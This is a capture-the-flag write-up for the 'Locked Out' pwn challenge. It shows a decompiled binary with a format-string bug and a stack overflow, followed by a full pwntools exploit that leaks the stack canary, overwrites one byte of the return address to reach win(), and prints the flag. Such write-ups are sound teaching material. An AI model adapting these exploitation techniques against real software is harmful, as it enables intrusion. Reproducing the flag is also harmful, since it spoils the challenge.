# Locked Out

- Category: pwn
- Difficulty: Medium
- Author: Togby & Nissen

After Brunnerne Inc.'s bakers went on strike, management locked them out and changed the PIN codes. We just need to talk our way back in before the brunsviger gets dry.

### Solution:

##### 1. Recon

```
$ file locked_out
locked_out: ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped

$ checksec --file=./locked_out
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
```

Full NX + canary + PIE — no shellcode, no naive return overwrite. Decompiling `play()` and `win()`:

```c
int64_t play()
{
    int32_t i = 4;
    srand(time(nullptr));
    pincode = rand() % 0x2710;        // 0 - 9999

    while (i > 0)
    {
        char var_1c;
        memset(&var_1c, 0, 5);
        printf("Please enter PIN: ");
        read(0, &var_1c, 0x20);       // reads up to 32 bytes into a small buffer
        char var_18_1 = 0;            // forcibly NUL-terminates at buf+4

        if (atoi(&var_1c) == pincode) {
            puts("Correct! Door is unlocked.");
            break;
        }

        i -= 1;
        printf(&var_1c);              // <-- FORMAT STRING BUG: user input as fmt
        printf(" is wrong! %d tries left.\n\n", (uint64_t)i);
    }
}

int64_t win()
{
    FILE* fp = fopen("flag.txt", "r");
    char buf[0x48];
    while (fgets(&buf, 0x40, fp))
        printf("%s", &buf);
    fclose(fp);
}
```

`win()` is never called from normal control flow — a ret2win target. `play()` has two bugs on the same 32-byte `read()`: a format-string bug (`printf(&var_1c)` with attacker data as the format) and a stack overflow (`read(0, buf, 0x20)` into a buffer with only 12 legitimate bytes before the canary).

##### 2. Work out the stack layout

From the `play()` disassembly (`sub rsp, 0x20`, canary loaded at `[rbp-0x8]`, loop counter `i` at `[rbp-0xc]`):

| Offset from `rbp` | Buffer offset | Contents |
|---|---|---|
| `rbp-0x14` | 0  | start of `buf` |
| `rbp-0x10` | 4  | forced NUL byte |
| `rbp-0xc`  | 8  | loop counter `i` (overlaps buf!) |
| `rbp-0x8`  | 12 | stack canary |
| `rbp+0x0`  | 20 | saved RBP |
| `rbp+0x8`  | 28 | saved return address |

`read(0, buf, 0x20)` writes all 32 bytes (offsets 0–31), reaching past the canary and saved RBP into the **first 4 bytes** of the 8-byte return address (offsets 28–31).

##### 3. The 4-character format-string budget

Right after `read()`, `var_18_1 = 0` unconditionally NULs buffer offset 4. Since `atoi()` and `printf()` both treat the buffer as a C string, they stop there — only the **first 4 characters** of any attempt are ever parsed as format specifiers, even though `read()` still wrote the rest of the buffer raw. That's exactly enough for one positional specifier: `%N$p` (4 chars, N = 1–9).

Breaking at the vulnerable `printf` in GDB and diffing register/stack values against the known canary/RBP/return-address confirmed:

```
position 9  ([rsp+24]) matches the canary
position 11 ([rsp+40]) matches the return address
```

So `%9$p` (4 chars) leaks the canary. The return address needs `%11$p` (5 chars) — one character too many for a single attempt.

##### 4. Sidestep the PIE leak

We don't need to leak the return address at all. `win()` sits at offset `0x13da`, and the address `play()` returns into inside `main()` is `0x13bf` — **same high byte**, only the low byte differs (`0xbf` vs `0xda`). PIE only randomizes the page-aligned load base, so that low byte is a compile-time constant regardless of ASLR. Overwriting just **1 byte** — offset 28 in the buffer, the LSB of the return address — with `0xda` turns the return address into `win()`'s real runtime address, no leak required.

##### 5. Bonus: the loop counter lives inside the overflow

`i` sits at buffer offset 8, squarely inside the 32 bytes `read()` controls. Setting those 4 bytes to `1` makes the post-decrement value `0`, so the loop exits immediately after the crafted attempt instead of needing all 4 tries — the whole exploit fits in 2 attempts.

##### 6. Exploit

Attempt 1 leaks the canary with `%9$p`; attempt 2 sends a 29-byte payload that restores the canary, sets `i = 1`, and overwrites the return address's low byte with `win()`'s:

```python
from pwn import *

context.log_level = 'info'
elf = ELF('./locked_out')

WIN_OFF = elf.symbols['win']          # 0x13da
RET_OFF = 0x13bf                      # instruction after `call play` in main
assert (WIN_OFF >> 8) == (RET_OFF >> 8), "high bytes differ, single-byte trick invalid"
LOW_BYTE = WIN_OFF & 0xff

def exploit(io):
    io.recvuntil(b'PIN: ')
    io.sendline(b'%9$p')                 # attempt 1: leak canary
    line = io.recvline()
    canary = int(line.split(b'is wrong')[0].strip(), 16)
    log.success(f"canary = {hex(canary)}")

    payload  = b'0000'              # offset 0-3 : PIN text (safe, no %)
    payload += b'\x00'              # offset 4   : forced NUL anyway
    payload += b'C' * 3             # offset 5-7 : filler
    payload += p32(1)               # offset 8-11: loop counter i -> 1
    payload += p64(canary)          # offset 12-19: canary
    payload += b'D' * 8             # offset 20-27: saved rbp (garbage ok)
    payload += bytes([LOW_BYTE])    # offset 28   : low byte of retaddr -> win()

    io.recvuntil(b'PIN: ')
    io.send(payload)                # attempt 2 (final): overflow

    print(io.recvall(timeout=3).decode(errors='replace'))

io = remote('locked-out-fe10f71d38e506cf-global.challs.brunnerne.xyz', 1337, ssl=True)
exploit(io)
```

```
$ python3 exploit.py
[+] canary = 0xe11913d710378100
0000 is wrong! 0 tries left.

brunner{no_brunsviger_left_behind}
```

**Flag:** `brunner{no_brunsviger_left_behind}`
